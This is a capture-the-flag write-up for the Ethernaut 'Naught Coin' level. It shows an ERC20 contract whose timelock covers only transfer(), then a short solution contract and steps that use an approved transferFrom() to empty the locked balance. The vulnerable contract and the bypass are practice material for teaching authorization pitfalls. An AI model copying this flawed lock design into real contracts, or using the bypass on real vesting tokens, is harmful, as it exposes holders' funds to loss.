# Naught Coin

NaughtCoin is an ERC20 token and you're already holding all of them. The catch is that you'll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0.

  Things that might help

- The ERC20 Spec
- The OpenZeppelin codebase


```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import 'openzeppelin-contracts-08/token/ERC20/ERC20.sol';

 contract NaughtCoin is ERC20 {

  // string public constant name = 'NaughtCoin';
  // string public constant symbol = '0x0';
  // uint public constant decimals = 18;
  uint public timeLock = block.timestamp + 10 * 365 days;
  uint256 public INITIAL_SUPPLY;
  address public player;

  constructor(address _player) 
  ERC20('NaughtCoin', '0x0') {
    player = _player;
    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
    // _totalSupply = INITIAL_SUPPLY;
    // _balances[player] = INITIAL_SUPPLY;
    _mint(player, INITIAL_SUPPLY);
    emit Transfer(address(0), player, INITIAL_SUPPLY);
  }
  
  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
    super.transfer(_to, _value);
  }

  // Prevent the initial owner from transferring tokens until the timelock has passed
  modifier lockTokens() {
    if (msg.sender == player) {
      require(block.timestamp > timeLock);
      _;
    } else {
     _;
    }
  } 
} 

```

## Solution

```
contract HackNaughtCoin {
    function hackCoin(IERC20 coin) external {
        address player = INaughtCoin(address(coin)).player(); // get the player address
        uint256 bal = coin.balanceOf(player);  // get the player balance
        coin.transferFrom(player, address(this), bal);  // Transfer the player'sbalance to HackNaughtCoin
    }
}

```

1. Deploy HackNaughtCoin contract.
2. Approve player balance (initial balance) to HackNaughtCoin contract's addreess.
3. Run hackCoin function in HackNaughtCoin.

### Hint from Ethernaut

When using code that's not your own, it's a good idea to familiarize yourself with it to get a good understanding of how everything fits together. This can be particularly important when there are multiple levels of imports (your imports have imports) or when you are implementing authorization controls, e.g. when you're allowing or disallowing people from doing things. In this example, a developer might scan through the code and think that transfer is the only way to move tokens around, low and behold there are other ways of performing the same operation with a different implementation.